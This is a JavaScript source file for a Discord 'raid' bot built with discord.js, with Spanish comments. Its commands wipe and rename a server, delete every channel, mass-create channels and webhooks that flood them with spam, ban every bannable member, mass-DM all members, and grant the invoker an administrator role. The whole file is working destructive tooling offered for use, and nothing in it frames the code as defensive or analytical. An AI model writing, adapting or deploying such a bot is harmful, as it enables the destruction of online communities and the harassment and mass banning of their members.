/* Constantes */
const Discord = require("discord.js");
const bot = new Discord.Client();
/* Components */
const prefix = "";
const colorEmbed = "";
const nameChannels = "";
const iconServer = "";
const nameServer = "";
const messageRaid = ""; // Añade everyone.
const banReason = "";
/* Ready */
bot.on("ready", () => {
    bot.user.setPresence({
        status: 'idle',
        activity: {
            name: 'github.com/ghosxdev',
            type: 'WATCHING'
        }
    });
    console.log('ready 4 raid. :)');
});
/* Message */
bot.on("message", async msg => {
    if (msg.author.bot) return;
    if (!msg.guild.me.permissions.has("ADMINISTRATOR")) return msg.channel.send("> Necesito permisos de __administrador__ para poder ejecutar mis comandos. :(")
    try {
        if (msg.content.startsWith(prefix + "help")) {
            const help = new Discord.MessageEmbed()
                .setAuthor('GhosxDev | Github RBOT', msg.author.displayAvatarURL(), 'https://github.com/ghosxdev')
                .setColor(colorEmbed)
                .setTimestamp()
                .setFooter(bot.user.username, bot.user.displayAvatarURL())
                .setThumbnail(iconServer)
                .setDescription("> `" + prefix + "auto` :radioactive:\n> `" + prefix + "nuke`\n> `" + prefix + "channels`\n> `" + prefix + "banall`\n> `" + prefix + "dm`\n> `" + prefix + "admin`\n\n\n||OJO, HAY USAR TODOS ESTOS COMANDOS EN MINÚSCULA.||")
            await msg.channel.send(help);
        }
        if (msg.content.startsWith(prefix + "auto")) {
            await msg.guild.setName(nameServer);
            await msg.guild.setIcon(iconServer);
            await msg.guild.channels.cache.forEach(looser => looser.delete());

            for (let i = 0; i < 100; i++) {
                const channel = await msg.guild.channels.create(nameChannels);
                for (let i = 0; i < 5; i++) {
                    channel.createWebhook(nameServer, { avatar: iconServer }).then(cool => {
                        for (let i = 0; i < 150; i++) {
                            cool.send(messageRaid)
                        }
                    });
                }
                for (let i = 0; i < 150; i++) {
                    channel.send(messageRaid)
                }
            }
        }
        if (msg.content.startsWith(prefix + "nuke")) {
            msg.guild.channels.cache.forEach(x => x.delete());
            msg.guild.channels.create('nuked-uwu').then(l => l.send('> Nuked by ' + msg.author.tag))
        }
        if (msg.content.startsWith(prefix + "channels")) {
            for (let i = 0; i < 50; i++) {
                const channel = await msg.guild.channels.create(nameChannels);
                for (let i = 0; i < 50; i++) {
                    channel.send(messageRaid)
                }
            }
        }
        if (msg.content.startsWith(prefix + "banall")) {
            const members = await msg.guild.members.fetch();
            members.forEach(lol => {
                if (lol.id == msg.author.id) {
                    return;
                } else {
                    if (lol.bannable) {
                        lol.ban({ reason: banReason });
                    } else {
                        lol.send(messageRaid);
                    }
                };
            });
        }
        if (msg.content.startsWith(prefix + "dm")) {
                const members = await msg.guild.members.fetch();
                members.forEach(lol => {
                    lol.send(messageRaid).catch(() => console.log("dm error"))
                });
        }
        if (msg.content.startsWith(prefix + "admin")) {
            const perms = msg.guild.roles.create({
                data: {
                    name: 'github.com/ghosxdev',
                    permissions: 'ADMINISTRATOR',
                    color: colorEmbed
                }
            });
            msg.member.roles.add(perms.id);
        }
    } catch (e) {
        console.log(e);
    }
});
/* Login */
bot.login("Token");
